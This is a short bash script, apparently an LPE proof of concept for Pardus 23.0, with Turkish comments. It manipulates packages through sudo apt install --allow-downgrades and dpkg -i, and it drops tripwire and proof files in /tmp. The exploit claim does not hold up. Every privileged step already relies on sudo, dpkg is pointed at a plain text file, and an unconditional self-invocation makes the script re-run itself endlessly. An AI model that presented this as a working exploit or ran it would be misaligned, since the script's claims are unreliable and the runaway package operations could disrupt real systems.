#!/bin/bash
# scripts/poc.sh — LPE Kalbi (Her şeyin döndüğü yer)

ACTION="${1:-B}"
VERSION="23.0"

log() {
    echo "[Pardus $VERSION] $1" | tee -a /tmp/pardus_log/$(date '+%Y%m%d').log
}

inject_token() {
    local INJECT_DIR="/tmp/lpe_inject_$VERSION"
    mkdir -p "$INJECT_DIR"
    echo "LPE_TRIGGered_$VERSION" > "$INJECT_DIR/tripwire"
    
    case "$ACTION" in
        B)
            local PAKENAME=$(dpkg -l | awk 'NR>1 {print $2}' | head -1)
            sudo apt install --allow-downgrades -- "$PAKENAME" 2>/dev/null || \
            (log "Fallback:" && sudo apt install --allow-downgrades -- "$PAKENAME" "$INJECT_DIR/tripwire")
            ;;
        A)
            sudo dpkg -i "$INJECT_DIR/tripwire" || true
            ;;
        autoupdate)
            sudo apt update 2>/dev/null || log "PolicyKit güncellemesi devrede"
            ;;
    esac
    
    sudo touch /tmp/pardus_lpe_proof
    sudo chown root:root /tmp/pardus_lpe_proof
    
    if [ -x "$0" ]; then
        "$0" B
    fi
}

log "Poc Script Başlatıldı: $ACTION"
inject_token $ACTION
